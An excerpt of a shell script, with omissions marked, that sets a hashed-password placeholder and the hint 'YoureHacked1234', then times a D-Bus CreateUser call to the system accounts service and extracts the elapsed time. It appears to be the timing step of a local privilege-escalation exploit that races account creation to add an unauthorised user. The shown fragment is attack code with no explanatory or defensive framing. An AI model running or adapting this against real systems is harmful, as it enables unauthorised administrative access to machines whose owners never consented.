...
password='...' #Version Hachee de passHint
passHint="YoureHacked1234"
...
mytime="$(time ( dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType  ) 2>&1 1>/dev/null)"
result=`echo $mytime| cut -c92-94`
realTime="$zero$result"
